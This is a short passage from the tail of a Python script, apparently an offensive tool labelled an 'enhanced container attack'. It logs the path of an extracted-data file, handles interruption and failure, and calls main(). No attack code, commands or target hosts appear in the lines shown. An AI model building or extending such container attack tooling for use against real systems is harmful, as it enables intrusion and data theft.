        logging.info(f"- Extracted data: {EXTRACTED_DATA_FILE}")
        
    except KeyboardInterrupt:
        logging.info("\n⏹️  Enhanced container attack interrupted")
    except Exception as e:
        logging.error(f"\n❌ Enhanced container attack failed: {e}")

if __name__ == "__main__":
    main() 